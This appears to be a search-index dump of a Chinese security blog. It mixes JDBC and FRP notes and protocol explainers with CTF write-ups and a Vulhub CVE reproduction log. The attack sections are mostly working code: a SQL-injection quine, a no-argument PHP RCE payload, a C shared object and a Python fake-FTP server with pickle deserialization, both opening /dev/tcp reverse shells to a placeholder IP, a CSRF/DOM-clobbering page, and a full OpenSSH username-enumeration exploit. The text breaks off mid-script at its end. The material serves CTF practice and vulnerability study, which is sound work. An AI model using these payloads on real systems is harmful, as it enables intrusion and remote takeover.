[{"title":"JavaWeb入门","url":"/posts/84f639f6.html","content":"\n# JavaWeb\n\n### JDBC API\n\n快速入门\n\n1. 创建工程导入驱动jar包\n2. 注册驱动`Class.forName(\"com.mysql.jdbc.Driver\");`\n3. 获取链接`Connection conn= DriverManager.getConnection(url,username,password);`\n4. 准备sql语句`String sql=\"update nnn set id=5 where id=4\";`\n5. 获取执行sql对象Statement`Statement stmt=conn.createStatement();`\n6. 执行sql并获取返回内容`int count=stmt.executeUpdate(sql);`\n7. 关闭链接`stmt.close();conn.close();`\n\n### API详解\n\n##### DriverManager\n\n- 驱动管理类的作用\n  - 注册驱动\n  - 获取数据库的连接\n- 一些方法（都是静态方法）\n  - `getConnection()`尝试建立与给定数据库URL的连接\n    - url：jdbc:数据库类型://IP:端口/数据库名称?参数\n  - `registerDriver()`注册给定的驱动程序，上面mysql中的Driver类本质利用的还是这个函数\n\n##### Connection\n\n- 数据库连接对象的作用\n\n  - 获取执行SQL的对象\n  - 管理事务\n\n- 一些方法\n\n  - `Statement createStatement()`普通执行SQL对象\n  - `PreparedStatement preparedStatement(sql)`预编译SQL的执行SQL对象，防SQL注入\n    - 首先获取一个PreparedStatement对象，然后SQL语句中的参数值用?代替占位\n    - 进行`setxxx(参数1,参数2)`来给?赋值\n    - 直接执行无需再次穿参\n\n  - MySQL事务管理\n  - `setAutoCommit(boolen)`true为自动提交事务，false为手动提交事务，即为开启事务\n  - `commit()`提交事务\n  - `rollback()`回滚事务\n\n##### Statement\n\n- 作用：执行SQL语句\n- `int executeUpdate(sql)`执行DML，DDL语句，返回DML语句影响的行数，DDL语句执行后，执行成功也可能返回0\n- `ResultSet executeQuery(sql)`执行DQL语句，返回结果集对象\n- ResultSet\n  - `next()`光标向后移一位并判断是否有内容\n  - `gets数据类型(列名或列数)`获取当前光标指向的内容\n\n##### 数据库连接池\n\n- 为了保持数据库连接存在\n\n- 使用过程\n\n  1. 导入jar包\n\n  2. 定义配置文件，示例如下\n\n     ```\n     driverClassName=com.mysql.jc.jdbc.Driver\n     url=jdbc:mysql://127.0.0.1:3306/db1?characterEncoding=utf-8\n     username=root\n     password=123456\n     initialSize=5\n     maxActive=10\n     maxWait=5000\n     ```\n\n  3. 导入配置文件`Properties prop=new Properties();`\n\n     `prop.load(new FileInputStream(\"/Users/jlan/IdeaProjects/JavaWeb/jdbc-demo/src/druid.properties\"));`\n\n  4. 建立连接`DataSource dataSource= DruidDataSourceFactory.createDataSource(prop);`\n     `Connection connection=dataSource.getConnection();`\n\n\n\n"},{"title":"一些小小工具的使用","url":"/posts/78e6073f.html","content":"\n## FRP\n\n### FRPS（服务端配置）\n\n```\n#frps.ini\n[common]\nbind_port        = 7000                # 服务监听端口\nbind_addr        = 0.0.0.0             # 监听IP\ntoken            = 123456              # 密钥\n#以下为可选内容\ndashboard_port   = 7500                # web面板\ndashboard_user   = admin               # 面板用户名\ndashboard_pwd    = admin               # 面板密码\nsubdomain_host   = *.your_doming.com   # WEB访问域名绑定（绑定后只能绑定子域名访问）\nvhost_http_port  = 10000               # web服务http端口\nvhost_https_port = 10001               # web服务https端口\n```\n\n### FRPC（客户端配置）\n\n```\n#frpc\n[common]\nserver_addr = 1.1.1.1             # 服务器IP或者地址\nserver_port = 7000                # 服务器提供的端口号\ntoken = 123456.                   # 服务器提供的token\n#以下为不同服务通用配置模版\n[服务名]\ntype = tcp                        # 协议类型\nlocal_ip = 127.0.0.1              # 穿透的本地地址\nlocal_port = 5001                 # 穿透的本地端口\n[服务名]\ntype = http                       # 协议类型\nlocal_ip = 127.0.0.1              # 穿透的本地地址\nlocal_port = 80                   # 穿透的本地端口\ncustom_domains = frp.darkflow.top # 填写你的域名\n```\n\n"},{"url":"/posts/0.html","content":"## WEB\n\n### 简单包含\n\n使用大量无用数据让waf失效，直接base64读文件\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202207030945613.png)\n\n### can_u_login\n\n参考之前比赛[2021第五空间CTF师傅](https://www.shysecurity.com/post/20140705-SQLi-Quine)的wp\n\n```php\n<?php \nerror_reporting(0); \nhighlight_file(__FILE__); \n$con = mysqli_connect(\"localhost\",\"root\",\"root\",\"www\"); \nfunction waf($sql) { \n    if (preg_match(\"/infor|sys|sql|thread|case|if|like|left|right|mid|cmp|sub|locate|position|match|find|field|sleep|repeat|lock|bench|process|<|>|=|xor|and|&&|\\\\\\\\/i\", $sql)) { \n        die(\"hacker\"); \n    } \n} \nif (isset($_GET['password'])) { \n    $password = $_GET['password']; \n    waf($password); \n    $sql = \"SELECT password FROM users WHERE username='admin' and password='$password'\"; \n    $user_result = mysqli_query($con,$sql); \n    $row = mysqli_fetch_array($user_result); \n    if ($row['password'] === $password) { \n        include \"/flag.txt\"; \n    } else { \n        echo \"password error\"; \n    } \n}\n```\n\n代码几乎一致～～～\n\n代码流程为：密码进行waf函数检测->用户名和密码带入数据库进行密码查询->查询后的值不能为空->查询后的值需要和你输入的值一致。最终才可以得到flag\n\npayload如下\n\n```\n'union/**/select/**/REPLACE(REPLACE('\"union/**/select/**/REPLACE(REPLACE(\"^\",CHAR(34),CHAR(39)),CHAR(94),\"^\")AS/**/fff%23',CHAR(34),CHAR(39)),CHAR(94),'\"union/**/select/**/REPLACE(REPLACE(\"^\",CHAR(34),CHAR(39)),CHAR(94),\"^\")AS/**/fff%23')AS/**/fff%23\n```\n\n### 简单PHP\n\n取反绕过，还有无参RCE，直接扔payload吧\n\n```\n?code=[~%8C%86%8C%8B%9A%92][!%FF]([~%9A%91%9B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()))\n\n请求头最后一个加命令\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202207030943742.png)\n\n\n\n## Misc\n\n### what_is_log\n\n装了sysdig滤出所有的mysql进程日志\n\n```\nsysdig -r flag2.scap proc.name=mysql\n```\n\n最下面有明显mysql查询返回结果，直接把success后的内容拿出来\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202207030944716.png)\n\nOK"},{"title":"ACTF 2022","url":"/posts/1c461d7e.html","content":"\n# ACTF 2022\n\n~~和学长一起熬大夜做不出来题真是太爽🌶️，下次继续~~\n\n## gogogo\n\n是CVE，好耶\n\n[CVE-2017-17562](https://github.com/vulhub/vulhub/blob/master/goahead/CVE-2017-17562/README.zh-cn.md)\n\n先写弹shell的so文件\n\n```c\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\n__attribute__ ((__constructor__)) void aaanb(void)\n{\n    system(\"/bin/bash -c 'bash -i >& /dev/tcp/IP/端口 0>&1'\");\n}\n//gcc -shared -fPIC ./payload.c -o payload.so\n```\n\n将生成的so文件作为文件发送，并且在请求头中添加`LD_PRELOAD=/proc/self/fd/0`，由于题目是公共环境。需要对最后数字进行爆破\n\n## ToLeSion\n\n~~熬一晚上没做出来的题~~\n\n还是学到了很多东西的，先看题，curl访问链接，看了一下剩下的~~我认识的~~协议只有FTPS了，又题目中写了使用了memcached，外加题目环境是python，最终找到了[这个](https://blog.zeddyu.info/2021/05/19/tls-ctf/)，大概流程就是通过TLS复用，将payload放到TLS进行身份识别的SessionID的位置，导致非法的内容被注入到memcached中，然后更改sessionID将实现pickle反序列化来反弹shell\n\n本题具体流程如下\n\n- 首先伪造一个FTPS服务器，并且利用代理更改TLS中SessionID为我们的payload\n- 在受害者访问我们的FTPS服务器，通过被动连接的方式将数据链路的地址端口指向受害者本地的memcached服务\n- 此时受害者对数据链路进行TLS会话复用，将带有payload的TLS客户端请求发送到memcached服务，导致memcached命令执行，将我们构造的序列化内容写入到目标的memcached库中\n- 最后更改sessionID并重新访问网页，服务器取出序列化后内容反序列化，反弹shell\n\nOK上面的流程都已经懂了，那么我们怎么实现呢，首先是伪造服务器（来自学长的完整脚本）\n\n```python\nimport os\nimport pickle\nimport socketserver\nimport sys\n\nimport redis\nclass Test2(object):\n    def __reduce__(self):\n        cmd = \"bash -c 'exec bash -i &>/dev/tcp/IP/端口 <&1'\"\n        return (os.system,(cmd,))\npickle_code=pickle.dumps(Test2())\nprint(pickle_code)\nlength=len(pickle_code)\npayload=b\"\\r\\nset actfSession:J1an 0 0 \"+str(len(pickle_code)).encode()+b\"\\r\\n\"+pickle_code+b\"\\r\\n\"\ndef set_payload(payload):\n    r = redis.Redis(host='127.0.0.1', port=6379, db=0)\n    print('payload len: ', len(payload), file=sys.stderr)\n    r.set('payload', payload)\n    return payload\n\nprint(\"设置的sessionid为:\",set_payload(payload))\nprint(\"payload长度为:\",len(payload))\n\n\n\n\nclass MyTCPHandler(socketserver.StreamRequestHandler):\n    def handle(self):\n        print(0,'[+] connected', self.request, file=sys.stderr)\n        self.request.sendall(b'220 (vsFTPd 3.0.3)\\r\\n')\n\n        self.data = self.rfile.readline().strip().decode()\n        print(1,self.data, file=sys.stderr,flush=True)\n        self.request.sendall(b'230 Login successful.\\r\\n')\n\n        self.data = self.rfile.readline().strip().decode()\n        print(2,self.data, file=sys.stderr)\n        self.request.sendall(b'227 yolo\\r\\n')\n\n        self.data = self.rfile.readline().strip().decode()\n        print(3,self.data, file=sys.stderr)\n        self.request.sendall(b'227 yolo\\r\\n')\n\n        self.data = self.rfile.readline().strip().decode()\n        print(4,self.data, file=sys.stderr)\n        self.request.sendall(b'257 \"/\" is the current directory\\r\\n')\n# vps:importlib/a/b\n#         self.data = self.rfile.readline().strip().decode()\n#         print(5,self.data, file=sys.stderr)\n#         self.request.sendall(b'250 Directory successfully changed.\\r\\n')\n#\n#         self.data = self.rfile.readline().strip().decode()\n#         print(6,self.data, file=sys.stderr)\n#         self.request.sendall(b'250 Directory successfully changed.\\r\\n')\n\n        self.data = self.rfile.readline().strip().decode()\n        print(7,self.data, file=sys.stderr)\n        self.request.sendall(b'227 Entering Passive Mode (127,0,0,1,43,192)\\r\\n')\n\n        self.data = self.rfile.readline().strip().decode()\n        print(8,self.data, file=sys.stderr)\n\n        self.request.sendall(b'227 Entering Passive Mode (127,0,0,1,43,192)\\r\\n')\n        self.data = self.rfile.readline().strip().decode()\n        print(9,self.data, file=sys.stderr)\n        self.request.sendall(b'200 Switching to Binary mode.\\r\\n')\n        # self.data = self.rfile.readline().strip().decode()\n        # # assert 'SIZE refs' == self.data, self.data\n        # self.finish()\n        # print(10,self.data, file=sys.stderr)\n        self.request.sendall(b'213 7\\r\\n')\n        self.data = self.rfile.readline().strip().decode()\n        print(self.data, file=sys.stderr)\n        self.request.sendall(b'125 Data connection already open. Transfer starting.\\r\\n')\n        self.data = self.rfile.readline().strip().decode()\n        print(self.data, file=sys.stderr)\n        self.request.sendall(b'250 Requested file action okay, completed.')\n        print(\"DIE.....\")\n        # exit()\n\n\nprint(\"使用端口:\",sys.argv[1])\n\nwith socketserver.TCPServer(('0.0.0.0', int(sys.argv[1])), MyTCPHandler) as server:\n    while True:\n        print(\"start...\")\n        server.handle_request()\n        open(\"stop\", \"w\").write(\"OK\")\n        print(\"END....\")\n        # exit()\n```\n\n首先启动TLS的代理服务器，使用[工具](https://github.com/ZeddYu/TLS-poison/)设置好了之后，导入证书私钥通过一下命令打开代理\n\n```\nTLS-poison/client-hello-poisoning/custom-tls/target/debug/custom-tls -p 11211 --certs /home/ubuntu/tls/fullchain.pem --key /home/ubuntu/tls/privkey.pem forward 2048\n```\n\n此时我们发往11211端口的带TLS的请求就会被解密并转发到2048端口，由于这个工具通过读取redis中的payload来传输数据，所以我们要先将payload存入redis，然后让受害者对我们服务器的11211端口发起FTPS请求，此时我们伪造的服务器会让受害者的服务器到127.0.0.1:11200去获取ftp传输的数据，进行TLS复用，数据被注入\n\n~~后面就是赛后复盘的了~~\n\n## beWhatYouWannaBe\n\n首先P1通过CSRF获取admin，并且此处的Token值可计算\n\n```javascript\nconst ValidateToken = (Token) => {\n    var sha256 = crypto.createHash('sha256');\n    return sha256.update(Math.sin(Math.floor(Date.now() / 1000)).toString()).digest('hex') === Token;\n}\napp.post('/beAdmin', (req, res) => {\n    if (req.session.user != 'admin') {\n        res.send(\"sorry, only admin can be admin\")\n        return\n    }\n    const username = req.body.username\n    const csrftoken = req.body.csrftoken\n    if (ValidateToken(csrftoken)) {\n        User.updateMany({ username: username }, { isAdmin: true },\n            (err, users) => {\n                if (err) {\n                    res.send('something error when being admin')\n                    return\n                }\n                if (users.length == 0) {\n                    res.send('no one can be admin')\n                } else {\n                    res.send('wow success wow')\n                }\n            }\n        )\n    } else {\n        res.send('validate error')3\n    }\n})\n```\n\n获取P1的js构造如下\n\n```html\n<form id=\"form\" action=\"http://localhost:8000/beAdmin\" method=\"post\"> \n   \t<input name=\"username\" value=\"J1an\">\n   \t<input id=\"csrftoken\" name=\"csrftoken\" value=\"\"> \n</form>\n<script src=\"https://cdn.jsdelivr.net/npm/crypto-js@4.0.0/crypto-js.js\"></script>\n<script>\n  \tvar a=CryptoJS.SHA256(Math.sin(Math.floor(Date.now() / 1000)).toString()).toString();\n \t\tcsrftoken.value=a;\n  \tform.submit();\n</script>\n```\n\n再来看P2\n\n```javascript\nawait page.setJavaScriptEnabled(false)\nawait page.goto(url, { timeout: 5000 })\nconst data = await page.evaluate((url, FLAG) => {\n    if (fff.lll.aaa.ggg.value == \"this_is_what_i_want\") {\n        return fetch(url + '?part2=' + btoa(encodeURIComponent(FLAG.substring(16))));\n    } else {\n        return fetch(url + '?there_is_no_flag')\n    }\n}, url, FLAG)\n```\n\n说白了就是构造一个html使得`fff.lll.aaa.ggg.value == \"this_is_what_i_want\"`，使用[这个](https://portswigger.net/research/dom-clobbering-strikes-back)小trick来嵌套构造元素，最终两者拼接构造出的html如下\n\n```html\n<html>\n<body>\n    <iframe name=fff srcdoc=\"<form id=lll name=aaa><input name=ggg value=this_is_what_i_want></form><form id=lll></form>\">\n    <form id=\"form\" action=\"http://localhost:8000/beAdmin\" method=\"post\"> \n   \t<input name=\"username\" value=\"J1an\">\n   \t<input id=\"csrftoken\" name=\"csrftoken\" value=\"\"> \n</form>\n<script src=\"https://cdn.jsdelivr.net/npm/crypto-js@4.0.0/crypto-js.js\"></script>\n<script>\n  \tvar a=CryptoJS.SHA256(Math.sin(Math.floor(Date.now() / 1000)).toString()).toString();\n \t\tcsrftoken.value=a;\n  \tform.submit();\n</script>\n</body>\n</html>\n```\n\n## poorui\n\n基本全是非预期吧，登录flag去找flagbot要就行了ss\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"HTML的没用标签们","url":"/posts/87744434.html","content":"\n~~这堆标签就是我逃离web前端的原因~~\n\n## iframe\n\n**标签定义及使用说明**\n\n一个内联框架被用来在当前 HTML 文档中嵌入另一个文档\n"},{"title":"一些莫名其妙的协议详解","url":"/posts/6a15f91b.html","content":"\n众所周知啊，现在网络传输有非常多的协议，打CTF呢最近越来越没有什么正常的http协议了，所以准备写一个小小的文章稍微总结一下各种奇怪协议，万一以后用的到呢～～～\n\n<!--more -->\n\n## FTP\n\nFTP协议是互联网上广泛使用的文件传输协议\n\n客户端/服务器模式，基于TCP协议\n\n采用双TCP连接方式\n\n- 控制连接默认使用TCP端口号21，控制连接在整个会话期间都会保持打开\n- 数据连接默认使用TCP端口号20，数据连接在传输文件时打开，文件传输结束，连接终止\n\nFTP有两种文件传输模式\n\n- ASCII模式是默认的文件传输模式，会将文件转为标准ASCII码再进行传输\n- 二进制模式又称图像文件传输模式，文件会按照比特流的方式进行传输\n\nFTP采用两种数据传输方式\n\n- 主动（Standard）方式，又称为PORT方式，客户端首先向服务端发送PORT命令，告诉服务器用于数据传输的临时端口号，当进行数据传输时，由服务器向客户端指定端口发起连接，由于是服务器发起连接，所以叫主动方式，\n\n  FTP服务器必须和客户端建立一个新的连接用来传送数据。\n\n- 被动（Passive）方式，又称为PASV方式，服务器收到PASV命令后随即打开一个高端（大于1024）端口，并通知客户端在这个端口上传送数据，由客户端向服务端的指定端口发起连接，所以叫被动方式\n\n  FTP服务器不再需要建立一个新的和客户端之间的连接。\n\nFTP中的命令和应答：命令和应答在客户和服务器的控制连接上以 NVT ASCII码形式传送。这就要求在每行结尾都要返回C R、 L F对（也就是每个命令或每个应答）。这些命令都是3或4个字节的大写ASCII字符，其中一些带选项参数。下面是一些命令（来自客户端）\n\n| 命令                     | 说明                                          |\n| ------------------------ | --------------------------------------------- |\n| `ABOR`                   | 放弃先前的FTP命令与数据传输                   |\n| `LIST filename`          | 列表显示文件或目录                            |\n| `USER username`          | 服务器上的用户名                              |\n| `PASS password`          | 服务器上的口令                                |\n| `PORT n1,n2,n3,n4,n5,n6` | 客户端的IP地址与端口（n1.n2.n3.n4:n5*256+n6） |\n| `QUIT`                   | 注销                                          |\n| `RETR filename`          | 检索一个文件                                  |\n| `STOR filename`          | 存储一个文件                                  |\n| `SYST`                   | 从服务器返回系统编码类型                      |\n| `TYPE typeUSER`          | 说明文件传输模式：A表示ASCII码，I表示比特流   |\n\n而FTP的应答都是ASCII码形式的三位数字，并且跟有报文来帮助人工处理，这里是一些有用的[响应数据](https://blog.csdn.net/cbffyx/article/details/78891603)\n\n| 应答 | 说明                                                         |\n| ---- | ------------------------------------------------------------ |\n| 1yz  | 肯定预备应答，在发送另一个命令前期待另一个应答时启动         |\n| 2yz  | 肯定完成应答，一个新命令可以发送                             |\n| 3yz  | 肯定中介应答，该命令已被应答，但另一个命令必须被发送         |\n| 4yz  | 暂态否定完成应答，请求动作未发生，但差错是暂时的，命令可以过后再发 |\n| 5yz  | 永久性否定完成应答，命令不被接受并且不再进行重试             |\n| x0z  | 语法错误                                                     |\n| x1z  | 信息                                                         |\n| x2z  | 连接，应答指控制或数据连接                                   |\n| x3z  | 鉴别和记账，应答用于注册或记账命令                           |\n| x4z  | 未指明                                                       |\n| x5z  | 文件系统状态                                                 |\n\n下面是一次正常的FTP连接的双方数据交互的过程\n\n```\n响应: \t220 (vsFTPd 3.0.2)\n命令: \tAUTH TLS\n响应: \t530 Please login with USER and PASS.\n命令: \tAUTH SSL\n响应: \t530 Please login with USER and PASS.\n状态: \t不安全的服务器，不支持 FTP over TLS。\n命令: \tUSER test\n响应: \t331 Please specify the password.\n命令: \tPASS ****\n响应: \t230 Login successful.\n命令: \tOPTS UTF8 ON\n响应: \t200 Always in UTF8 mode.\n命令: \tCWD /\n响应: \t250 Directory successfully changed.\n命令: \tPWD\n响应: \t257 \"/\"\n命令: \tTYPE A\n响应: \t200 Switching to ASCII mode.\n命令: \tPASV\n响应: \t227 Entering Passive Mode (172,17,0,6,82,117).\n命令: \tSTOR main.py\n响应: \t150 Ok to send data.\n响应: \t226 Transfer complete.\n命令: \tTYPE I\n响应: \t200 Switching to Binary mode.\n命令: \tPASV\n响应: \t227 Entering Passive Mode (172,17,0,6,82,111).\n命令: \tLIST\n响应: \t150 Here comes the directory listing.\n响应: \t226 Directory send OK.\n```\n\n## WEBSOCKET\n\nHTTP协议有一个的缺陷为：通信只能由客户端发起。在一些场景下，这种单向请求的特点，注定了如果服务器有连续的状态变化，客户端要获知就非常麻烦。我们只能使用[轮询](https://so.csdn.net/so/search?q=轮询&spm=1001.2101.3001.7020)：每隔一段时候，就发出一个询问，了解服务器有没有新的信息。轮询效率低切浪费资源，此时，websocket就被发明了\n\nWebscoket是Web浏览器和服务器之间的一种全双工通信协议，其中WebSocket协议由IETF定为标准，WebSocket API由W3C定为标准。一旦Web客户端与服务器建立起连接，之后的全部数据通信都通过这个连接进行。通信过程中，可互相发送JSON、XML、HTML或图片等任意格式的数据。\n\n与HTTP的相同点：\n\n- 都是基于TCP的应用层协议\n- 都使用Request/Response模型进行连接的建立\n- 在连接的建立过程中对错误的处理方式相同，在这个阶段WS可能返回和HTTP相同的返回码\n\n不同之处在于：\n\n- WS使用HTTP来建立连接，但是定义了一系列新的header域，这些域在HTTP中并不会使用\n- WS的连接不能通过中间人来转发，它必须是一个直接连接\n- WS连接建立之后，通信双方都可以在任何时刻向另一方发送数据\n- WS连接建立之后，数据的传输使用帧来传递，不再需要Request消息\n- WS的数据帧有序\n\n![img](https://img-blog.csdnimg.cn/20200527233222508.png)\n\n这里是一个完整的websocket的过程数据流\n\n```\nGET / HTTP/1.1\nHost: localhost:3000\nPragma: no-cache\nAccept: */*\nSec-WebSocket-Key: bI1MuDR3aJuRuf8JYLkqVw==\nSec-WebSocket-Version: 13\nAccept-Language: zh-CN,zh-Hans;q=0.9\nSec-WebSocket-Extensions: permessage-deflate\nCache-Control: no-cache\nAccept-Encoding: gzip, deflate\nOrigin: null\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15\nConnection: Upgrade\nUpgrade: websocket\n\nHTTP/1.1 101 Switching Protocols\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Accept: NLLgtF7B4DX8+2TpfNbpeL/vprw=\n\n..\"c_.Z\n>.Q\n..ECHO: xiaosi..\"|.xZ...Q...ECHO: xiaosi..h..J...%....ECHO: xiaosi....L...-.....ECHO: xiaosi...+~L.B.#.B..ECHO: xiaosi..d...........ECHO: xiaosi........t.....ECHO: xiaosi..F...>...5...ECHO: xiaosi\n```\n\n- 第一行为为请求的方法，类型必须为GET，协议版本号必须大于1.1\n- Upgrade字段必须包含，值为websocket\n- Connection字段必须包含，值为Upgrade\n- Sec-WebSocket-Key字段必须包含 ，记录着握手过程中必不可少的键值。\n- Sec-WebSocket-Protocol字段必须包含 ，记录着使用的子协议\n\n\n\n## TFTP\n\nTFTP(Trival File Transfer Protocal，简单文件传输协议）该协议在熟知端口69上使用UDP服务。TFTP协议常用于无盘工作站或路由器从别的主机上获取引导配置文件，由于TFTP报文比较小，能够迅速复制这些文件。\n\n优点：TFTP协议代码所占用的内存小，其对应的软件也很小，所以能个很容易地放入到无盘工作站的ROM中，TFTP支持ASCII码或二进制传送。\n\n传输过程\n\n以TFTP客户向TFTP服务器发送读请求为例，说明整个过程。\n\n1. 服务器使用熟知端口号69被动打开连接；\n2. 客户主动打开连接，它使用临时端口作为源端口而熟知端口69作为目的端口，向服务器进程发送RRQ报文；\n3. 服务器主动打开连接，它使用新的临时端口作为源端口，而使用收到的来自客户的临时端口作为目的端口，向TFTP客户进程发送DATA报文（2B操作码，2B数据块的块号K，512B数据）；\n4. 客户收到服务器的报文后，发送4B的ACK（2B的操作码和2B的数据块号）给TFTP服务器，告诉它之前发送给客户的数据报已经收到；\n5. 重复步骤3-4，直到所有请求的数据发送完毕。\n\n![img](https://upload-images.jianshu.io/upload_images/2256198-62dba3beb7cb0353.png)\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"JavaScript与Nodejs","url":"/posts/8f3824ff.html","content":"\n从头开始了属于是\n\n**变量声明**\n\n```javascript\nvar x=1;\nconsole.log(x);\n```\n\nfor循环与if判断与C++格式相同\n\n**对象**\n"},{"title":"CVE","url":"/posts/67caa546.html","content":"\n# CVE\n\n在Vulhub上面的CVE复现，一份小记录\n\n## OpenSSH\n\n### CVE-2018-15473\n\n漏洞内容：在OpenSSH 7.7前存在一个用户名枚举漏洞，通过该漏洞，可以判断某个用户名是否存在于目标主机中\n\n漏洞作用：我们用弱口令、爆破等方式进行尝试登录时，ssh需要的用户名和账户名不管是一致还是不一致，都会给我们一个登录延迟的假象，让我们以为可以登录成功，实则不管你的用户名是否是正确的，它都会让你输入密码，然后告诉你登录失败，因此我们必须知道对方用户准确的用户名，让我们在接下来不管是弱口令登录还是暴力破解方面都很有帮助\n\n利用条件：OpenSSH 版本<7.7\n\n漏洞复现：\n\n1. 进入docker更改密码，此处改为`123456`\n\n2. ssh连接docker，查看`/etc/passwd`文件来查看用户名\n\n   ```\n   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n   bin:x:2:2:bin:/bin:/usr/sbin/nologin\n   sys:x:3:3:sys:/dev:/usr/sbin/nologin\n   sync:x:4:65534:sync:/bin:/bin/sync\n   games:x:5:60:games:/usr/games:/usr/sbin/nologin\n   man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n   lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n   mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n   news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n   uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n   proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n   www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n   backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n   list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n   irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\n   gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n   nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n   _apt:x:100:65534::/nonexistent:/bin/false\n   sshd:x:74:74:Privilege-separated SSH:/usr/local/sbin/sshd:/sbin/nologin\n   vulhub:x:1000:1000:,,,:/home/vulhub:/bin/bash\n   example:x:1001:1001:,,,:/home/example:/bin/bash\n   ```\n\n3. 测试exp\n\n   ```python\n   #!/usr/bin/env python\n   # python2 exp.py --port SSH端口 --userList 用户名字典 IP\n   ###########################################################################\n   #                ____                    _____ _____ _    _               #\n   #               / __ \\                  / ____/ ____| |  | |              #\n   #              | |  | |_ __   ___ _ __ | (___| (___ | |__| |              #\n   #              | |  | | '_ \\ / _ \\ '_ \\ \\___ \\\\___ \\|  __  |              #\n   #              | |__| | |_) |  __/ | | |____) |___) | |  | |              #\n   #               \\____/| .__/ \\___|_| |_|_____/_____/|_|  |_|              #\n   #                     | |               Username Enumeration              #\n   #                     |_|                                                 #\n   #                                                                         #\n   ###########################################################################\n   # Exploit: OpenSSH Username Enumeration Exploit (CVE-2018-15473)          #\n   # Vulnerability: CVE-2018-15473                                           #\n   # Affected Versions: OpenSSH version < 7.7                                #\n   # Author: Justin Gardner, Penetration Tester @ SynerComm AssureIT         #\n   # Github: https://github.com/Rhynorater/CVE-2018-15473-Exploit            #\n   # Email: Justin.Gardner@SynerComm.com                                     #\n   # Date: August 20, 2018                                                   #\n   ###########################################################################\n   \n   import argparse\n   import logging\n   import paramiko\n   import multiprocessing\n   import socket\n   import string\n   import sys\n   import json\n   from random import randint as rand\n   from random import choice as choice\n   # store function we will overwrite to malform the packet\n   old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]\n   \n   # list to store 3 random usernames (all ascii_lowercase characters); this extra step is added to check the target\n   # with these 3 random usernames (there is an almost 0 possibility that they can be real ones)\n   random_username_list = []\n   # populate the list\n   for i in range(3):\n       user = \"\".join(choice(string.ascii_lowercase) for x in range(rand(15, 20)))\n       random_username_list.append(user)\n   \n   # create custom exception\n   class BadUsername(Exception):\n       def __init__(self):\n           pass\n   \n   # create malicious \"add_boolean\" function to malform packet\n   def add_boolean(*args, **kwargs):\n       pass\n   \n   # create function to call when username was invalid\n   def call_error(*args, **kwargs):\n       raise BadUsername()\n   \n   # create the malicious function to overwrite MSG_SERVICE_ACCEPT handler\n   def malform_packet(*args, **kwargs):\n       old_add_boolean = paramiko.message.Message.add_boolean\n       paramiko.message.Message.add_boolean = add_boolean\n       result  = old_parse_service_accept(*args, **kwargs)\n       #return old add_boolean function so start_client will work again\n       paramiko.message.Message.add_boolean = old_add_boolean\n       return result\n   \n   # create function to perform authentication with malformed packet and desired username\n   def checkUsername(username, tried=0):\n       sock = socket.socket()\n       sock.connect((args.hostname, args.port))\n       # instantiate transport\n       transport = paramiko.transport.Transport(sock)\n       try:\n           transport.start_client()\n       except paramiko.ssh_exception.SSHException:\n           # server was likely flooded, retry up to 3 times\n           transport.close()\n           if tried < 4:\n               tried += 1\n               return checkUsername(username, tried)\n           else:\n               print('[-] Failed to negotiate SSH transport')\n       try:\n           transport.auth_publickey(username, paramiko.RSAKey.generate(1024))\n       except BadUsername:\n               return (username, False)\n       except paramiko.ssh_exception.AuthenticationException:\n               return (username, True)\n       #Successful auth(?)\n       raise Exception(\"There was an error. Is this the correct version of OpenSSH?\")\n   \n   # function to test target system using the randomly generated usernames\n   def checkVulnerable():\n       vulnerable = True\n       for user in random_username_list:\n           result = checkUsername(user)\n           if result[1]:\n               vulnerable = False\n       return vulnerable\n   \n   def exportJSON(results):\n       data = {\"Valid\":[], \"Invalid\":[]}\n       for result in results:\n           if result[1] and result[0] not in data['Valid']:\n               data['Valid'].append(result[0])\n           elif not result[1] and result[0] not in data['Invalid']:\n               data['Invalid'].append(result[0])\n       return json.dumps(data)\n   \n   def exportCSV(results):\n       final = \"Username, Valid\\n\"\n       for result in results:\n           final += result[0]+\", \"+str(result[1])+\"\\n\"\n       return final\n   \n   def exportList(results):\n       final = \"\"\n       for result in results:\n           if result[1]:\n               final+=result[0]+\" is a valid user!\\n\"\n           else:\n               final+=result[0]+\" is not a valid user!\\n\"\n       return final\n   \n   # assign functions to respective handlers\n   paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet\n   paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error\n   \n   # get rid of paramiko logging\n   logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())\n   \n   arg_parser = argparse.ArgumentParser()\n   arg_parser.add_argument('hostname', type=str, help=\"The target hostname or ip address\")\n   arg_parser.add_argument('--port', type=int, default=22, help=\"The target port\")\n   arg_parser.add_argument('--threads', type=int, default=5, help=\"The number of threads to be used\")\n   arg_parser.add_argument('--outputFile', type=str, help=\"The output file location\")\n   arg_parser.add_argument('--outputFormat', choices=['list', 'json', 'csv'], default='list', type=str, help=\"The output file location\")\n   group = 